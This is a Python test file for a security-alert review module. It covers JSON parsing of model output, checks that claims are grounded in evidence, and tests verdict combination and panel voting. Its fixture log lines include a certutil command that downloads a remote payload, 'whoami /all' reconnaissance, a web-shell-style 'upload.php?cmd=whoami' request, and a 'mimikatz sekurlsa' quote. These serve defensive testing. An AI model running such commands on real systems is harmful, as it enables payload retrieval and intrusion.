"""Grounding, prompt/case rendering, combine lattice, and panel aggregation."""

from __future__ import annotations

from collections.abc import Mapping

import pytest

from portal.modules.security.core.review import grounding, judge, panel
from portal.modules.security.core.review.contracts import (
    Channel,
    Claim,
    EvidenceRef,
    JudgeRecord,
    Outcome,
    ReviewConcern,
    Verdict,
)
from portal.modules.security.core.review.intake import EventView, IntakeResult

E1 = "wineventlog:aaa111"
E2 = "wineventlog:bbb222"
E3 = "web:access:ccc333"
TEXTS = {
    E1: "host=WKS05 user=evil cmd=certutil -urlcache -f http://x/payload.bin",
    E2: "host=WKS05 user=evil cmd=whoami /all",
    E3: "clientip=10.9.9.9 uri=/upload.php?cmd=whoami status=200",
}


def window(extra: Mapping[str, str] | None = None) -> IntakeResult:
    events = {
        i: EventView(i, i.rsplit(":", 1)[0], float(n), t) for n, (i, t) in enumerate(TEXTS.items())
    }
    for n, (i, t) in enumerate((extra or {}).items()):
        events[i] = EventView(i, i.rsplit(":", 1)[0], 100.0 + n, t)
    return IntakeResult(events=events)


def concern(*ids: str) -> ReviewConcern:
    return ReviewConcern(
        concern_id="cn-1",
        unit_id="u1",
        level="L2_ENTITY",
        outcome=Outcome.COUSIN,
        channels=(Channel.KNOWN_SIMILAR,),
        priority_p=0.004,
        source_ids=("wineventlog",),
        span_seconds=120.0,
        evidence=tuple(EvidenceRef(i, i.rsplit(":", 1)[0]) for i in (ids or (E1, E2))),
    )


# ── parsing ──────────────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "text",
    [
        '{"a": 1}',
        '```json\n{"a": 1}\n```',
        '<think>hmm {not json}</think>{"a": 1}',
        'Sure! Here you go: {"a": 1} hope that helps',
        '{"a": 1} trailing {"b": 2}',
    ],
)
def test_parse_json_object_tolerates_wrappers(text: str) -> None:
    assert judge.parse_json_object(text) == {"a": 1}


def test_parse_json_object_handles_braces_in_strings_and_rejects_garbage() -> None:
    assert judge.parse_json_object('x {"t": "a } b { c", "n": 2} y') == {"t": "a } b { c", "n": 2}
    assert judge.parse_json_object("no json here") is None
    assert judge.parse_json_object("[1, 2]") is None


# ── grounding ────────────────────────────────────────────────────────────────


def test_grounding_keeps_only_claims_a_checker_can_locate() -> None:
    claims = [
        Claim("ok", (E1,)),
        Claim("quote ok, case and spacing differ", (E1,), quote="CERTUTIL   -urlcache"),
        Claim("quote missing", (E1,), quote="mimikatz sekurlsa"),
        Claim("unknown id", ("web:access:nope",)),
        Claim("no evidence", ()),
        Claim("", (E1,)),
        Claim("short quote", (E1,), quote="cer"),
    ]
    report = grounding.verify_claims(claims, TEXTS)
    assert [c.text for c in report.kept] == ["ok", "quote ok, case and spacing differ"]
    reasons = {c.text: r for c, r in report.dropped}
    assert reasons["quote missing"] == "quote_not_found"
    assert reasons["unknown id"].startswith("unknown_evidence:")
    assert reasons["no evidence"] == "no_evidence" and reasons[""] == "empty_text"
    assert reasons["short quote"] == "quote_too_short"
    assert report.cited == 6 and report.resolved == 5
    assert report.citation_resolution == pytest.approx(5 / 6)


def test_parse_claims_reports_malformed_entries() -> None:
    claims, bad = grounding.parse_claims(
        [
            {"text": "a", "evidence_ids": "x"},
            "oops",
            {"text": "b", "evidence_ids": [1, 2], "quote": " "},
        ]
    )
    assert [(c.text, c.evidence_ids, c.quote) for c in claims] == [
        ("a", ("x",), None),
        ("b", ("1", "2"), None),
    ]
    assert bad == 1
    assert grounding.parse_claims(None) == ([], 0)


# ── judge rendering & combine ────────────────────────────────────────────────


def test_the_case_text_cites_ids_caps_events_and_registers_only_what_it_shows() -> None:
    text, registry, total = judge.render_case(concern(E1, E2, E3), window(), max_events=2)
    assert total == 3 and set(registry) == {E1, E2}
    assert f"[{E1}]" in text and f"[{E3}]" not in text and "showing 2 of 3" in text
    assert "RESEMBLES" not in text and "EXISTING DETECTION: INDETERMINATE" in text


def test_combine_lattice_is_exhaustive() -> None:
    cases = {
        (Verdict.UNSURE, "upheld", 0): Verdict.UNSURE,
        (Verdict.SOMETHING, "upheld", 0): Verdict.SOMETHING,
        (Verdict.SOMETHING, "refuted", 1): Verdict.UNSURE,
        (Verdict.SOMETHING, "refuted", 0): Verdict.SOMETHING,
        (Verdict.SOMETHING, "", 0): Verdict.SOMETHING,
        (Verdict.NOTHING, "upheld", 0): Verdict.NOTHING,
        (Verdict.NOTHING, "refuted", 2): Verdict.UNSURE,
        (Verdict.NOTHING, "insufficient", 0): Verdict.UNSURE,
        (Verdict.NOTHING, "", 0): Verdict.UNSURE,
    }
    for (verdict, stance, objections), expected in cases.items():
        assert judge.combine(verdict, stance, objections)[0] == expected


def test_prompt_digest_is_stable() -> None:
    assert judge.prompt_digest() == judge.prompt_digest() and len(judge.prompt_digest()) == 12


# ── panel ────────────────────────────────────────────────────────────────────


def rec(model: str, verdict: Verdict, *, degraded: str = "") -> JudgeRecord:
    claims = (Claim("shared claim", (E1,)),) if verdict == Verdict.SOMETHING else ()
    return JudgeRecord(
        model=model, verdict=verdict, confidence=0.7, claims=claims, degraded=degraded
    )


POLICY = panel.PanelPolicy(minimum_participation=0.6, quorum=0.5)


def test_panel_needs_a_quorum_of_voters() -> None:
    out = panel.panel_verdict(
        [rec("a", Verdict.SOMETHING), rec("b", Verdict.SOMETHING), rec("c", Verdict.UNSURE)], POLICY
    )
    assert out.verdict == Verdict.SOMETHING and out.panel["votes"]["SUPPORT"] == 2
    assert [c.text for c in out.claims] == ["shared claim"]


def test_a_split_or_thin_panel_is_unsure_and_never_silences() -> None:
    split = panel.panel_verdict(
        [rec("a", Verdict.SOMETHING), rec("b", Verdict.NOTHING), rec("c", Verdict.UNSURE)], POLICY
    )
    assert split.verdict == Verdict.UNSURE
    lone_nothing = panel.panel_verdict(
        [rec("a", Verdict.NOTHING), rec("b", Verdict.UNSURE), rec("c", Verdict.UNSURE)], POLICY
    )
    assert (
        lone_nothing.verdict == Verdict.UNSURE
        and "participation" in lone_nothing.panel["rationale"]
    )


def test_failed_members_do_not_shrink_the_roster() -> None:
    out = panel.panel_verdict(
        [
            rec("a", Verdict.NOTHING),
            rec("b", Verdict.UNSURE, degraded="timeout"),
            rec("c", Verdict.UNSURE, degraded="timeout"),
        ],
        POLICY,
    )
    assert out.verdict == Verdict.UNSURE
    assert panel.panel_verdict([], POLICY).verdict == Verdict.UNSURE
    assert (
        panel.panel_verdict([rec("a", Verdict.UNSURE, degraded="x")], POLICY).degraded
        == "every panel member failed"
    )
